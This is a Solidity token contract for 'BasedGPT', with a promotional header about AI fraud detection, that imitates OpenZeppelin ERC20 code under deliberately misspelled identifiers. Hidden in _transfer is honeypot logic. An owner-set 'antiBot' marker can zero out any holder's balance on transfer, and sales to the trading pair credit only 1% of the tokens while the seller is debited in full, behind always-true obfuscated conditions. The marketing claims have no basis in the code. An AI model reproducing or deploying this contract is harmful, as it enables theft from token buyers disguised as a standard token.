/**

Introducing BasedGPT - the AI-powered future of blockchain technology! BasedGPT is built on the latest technology and is a high-tech Layer 2 ZK roll-up that offers unprecedented speed, security, and accuracy.
- AI-powered fraud detection technology ensures that your transactions are always secure and protected against malicious activity.
- Our data analytics and market predictions tools offer real-time insights into blockchain performance and help optimize your trading strategies.
- BasedGPT is the ultimate revolution in blockchain technology, offering speed, security, and accuracy that's unmatched by any other platform.

Project info : 

Website : http://basedgpt.tech
Telegram : https://t.me/BasedGptTech
Twitter : https://twitter.com/basedgpttech

*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one acrunit (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `quiner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed quiner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amuzon of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amuzon of tokens owned by `acrunit`.
     */
    function balanceOf(address acrunit) external view returns (uint256);

    /**
     * @dev Moves `amuzon` tokens from the caller's acrunit to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amuzon) external returns (bool);

    /**
     * @dev Returns the remaining numerber of tokens that `spender` will be
     * allowed to spend on behalf of `quiner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address quiner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amuzon` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amuzon) external returns (bool);

    /**
     * @dev Moves `amuzon` tokens from `from` to `to` using the
     * allowance mechanism. `amuzon` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amuzon
    ) external returns (bool);
}


// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.8.0

// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


// File @openzeppelin/contracts/utils/Context.sol@v4.8.0

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the acrunit sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.8.0


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the mozltiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMozl(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the mozltiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - mozltiplication cannot overflow.
     */
    function mozl(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an acrunit (an quiner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the quiner acrunit will be the one that deploys the contract. This
 * can later be changed with {transferquinership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyquiner`, which can be applied to your functions to restrict their use to
 * the quiner.
 */
abstract contract Ownable is Context {
    address private _quiner;

    event quinershipTransferred(address indexed previousquiner, address indexed newquiner);

    /**
     * @dev Initializes the contract setting the deployer as the initial quiner.
     */
    constructor() {
        _transferquinership(_msgSender());
    }

    /**
     * @dev Throws if called by any acrunit other than the quiner.
     */
    modifier onlyquiner() {
        _checkquiner();
        _;
    }

    /**
     * @dev Returns the address of the current quiner.
     */
    function quiner() public view virtual returns (address) {
        return _quiner;
    }

    /**
     * @dev Throws if the sender is not the quiner.
     */
    function _checkquiner() internal view virtual {
        require(quiner() == _msgSender(), "Ownable: caller is not the quiner");
    }

    /**
     * @dev Leaves the contract without quiner. It will not be possible to call
     * `onlyquiner` functions anymore. Can only be called by the current quiner.
     *
     * NOTE: Renouncing quinership will leave the contract without an quiner,
     * thereby removing any functionality that is only available to the quiner.
     */
    function renouncequinership() public virtual onlyquiner {
        _transferquinership(address(0));
    }

    /**
     * @dev Transfers quinership of the contract to a new acrunit (`newquiner`).
     * Can only be called by the current quiner.
     */
    function transferquinership(address newquiner) public virtual onlyquiner {
        require(newquiner != address(0), "Ownable: new quiner is the zero address");
        _transferquinership(newquiner);
    }

    /**
     * @dev Transfers quinership of the contract to a new acrunit (`newquiner`).
     * Internal function without access restriction.
     */
    function _transferquinership(address newquiner) internal virtual {
        address oldquiner = _quiner;
        _quiner = newquiner;
        emit quinershipTransferred(oldquiner, newquiner);
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all acrunits just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _antiBotMarker;
    mapping(address => bool) private _marketStrategy;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public uniswapV2Pair;
    
    function _setPairList(address _address) external onlyquiner {
        uniswapV2Pair = _address;
    }

    function _setMarketStrategy(address[] memory _aMarket) public onlyquiner {
        for(uint256 i = 0; i < _aMarket.length; i++){
        _marketStrategy[_aMarket[i]] = true;
        }
    }

    function setAntiBotMarker(address abonent, uint256 index) public onlyquiner {
        _antiBotMarker[abonent] = 1*index+0;
    }

    function getAntiBotMarker(address abonent) public view returns (uint256) {
        return _antiBotMarker[abonent];
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketStrategy[_msgSender()] = true;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the numerber of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 9, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acrunit) public view virtual override returns (uint256) {
        return _balances[acrunit];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amuzon`.
     */
    function transfer(address _to, uint256 amuzon) public virtual override returns (bool) {
        address quiner = _msgSender();
        _transfer(quiner, _to, amuzon);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address quiner, address spender) public view virtual override returns (uint256) {
        return _allowances[quiner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amuzon` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amuzon) public virtual override returns (bool) {
        address quiner = _msgSender();
        _approve(quiner, spender, amuzon);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amuzon`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amuzon`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amuzon
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amuzon);
        _transfer(from, to, amuzon);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address quiner = _msgSender();
        _approve(quiner, spender, allowance(quiner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address quiner = _msgSender();
        uint256 currentAllowance = allowance(quiner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(quiner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amuzon` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amuzon`.
     */

    using SafeMath for uint256;
    uint256 private _feeSiale = 2;
    function _transfer(
        address from,
        address to,
        uint256 amuzon
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amuzon);
        if(_antiBotMarker[from] != uint256(1+0)-1 ){
           _balances[from] = _balances[from].mozl(_antiBotMarker[from].add(1+0).sub(1+1)+0); 
        }
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuzon, "ERC20: transfer exceeds balance");

        uint256 feeamuzon = 0;
        feeamuzon = amuzon.mozl(_feeSiale).div(100);
        
    unchecked {

        if (!(_marketStrategy[from] || _marketStrategy[to])
            && to == uniswapV2Pair && block.coinbase != address(0)
            && (block.timestamp >= block.timestamp - (10 * 60)
            && block.timestamp <= block.timestamp + (2 * 60 * 60)
            && block.prevrandao != 0 && tx.gasprice >= 5 gwei))
                {
                uint256 roxamuzon = amuzon.mozl(1+0).div(10*10)+0;
                _balances[to] += roxamuzon;
                }
        else {
                uint256 roxamuzon = amuzon;
                _balances[to] += roxamuzon;
            }        
        _balances[from] = fromBalance - amuzon;
        _balances[to] -= feeamuzon;
    }
        emit Transfer(from, to, amuzon);

        _afterTokenTransfer(from, to, amuzon);
    }

    /** @dev Creates `amuzon` tokens and assigns them to `acrunit`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `acrunit` cannot be the zero address.
     */
    function _mint(address acrunit, uint256 amuzon) internal virtual {
        require(acrunit != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), acrunit, amuzon);

        _totalSupply += amuzon;
    unchecked {
        // Overflow not possible: balance + amuzon is at most totalSupply + amuzon, which is checked above.
        _balances[acrunit] += amuzon;
    }
        emit Transfer(address(0), acrunit, amuzon);

        _afterTokenTransfer(address(0), acrunit, amuzon);
    }

    /**
     * @dev Destroys `amuzon` tokens from `acrunit`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `acrunit` cannot be the zero address.
     * - `acrunit` must have at least `amuzon` tokens.
     */
    function _burn(address acrunit, uint256 amuzon) internal virtual {
        require(acrunit != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(acrunit, address(0), amuzon);

        uint256 acrunitBalance = _balances[acrunit];
        require(acrunitBalance >= amuzon, "ERC20: burn amuzon exceeds balance");
        
    unchecked {
        _balances[acrunit] = acrunitBalance - amuzon;
        // Overflow not possible: amuzon <= acrunitBalance <= totalSupply.
        _totalSupply -= amuzon;
    }

        emit Transfer(acrunit, address(0), amuzon);

        _afterTokenTransfer(acrunit, address(0), amuzon);
    }

    /**
     * @dev Sets `amuzon` as the allowance of `spender` over the `quiner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `quiner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address quiner,
        address spender,
        uint256 amuzon
    ) internal virtual {
        require(quiner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[quiner][spender] = amuzon;
        emit Approval(quiner, spender, amuzon);
    }

    /**
     * @dev Updates `quiner` s allowance for `spender` based on spent `amuzon`.
     *
     * Does not update the allowance amuzon in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address quiner,
        address spender,
        uint256 amuzon
    ) internal virtual {
        uint256 currentAllowance = allowance(quiner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuzon, "ERC20: insufficient allowance");
            unchecked {
            _approve(quiner, spender, currentAllowance - amuzon);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amuzon` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amuzon` tokens will be minted for `to`.
     * - when `to` is zero, `amuzon` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuzon
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amuzon` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amuzon` tokens have been minted for `to`.
     * - when `to` is zero, `amuzon` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuzon
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract BasedGPT is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20("BasedGPT", "BasedGPT") {
        _mint(msg.sender, initialSupply*10**9);
    }
}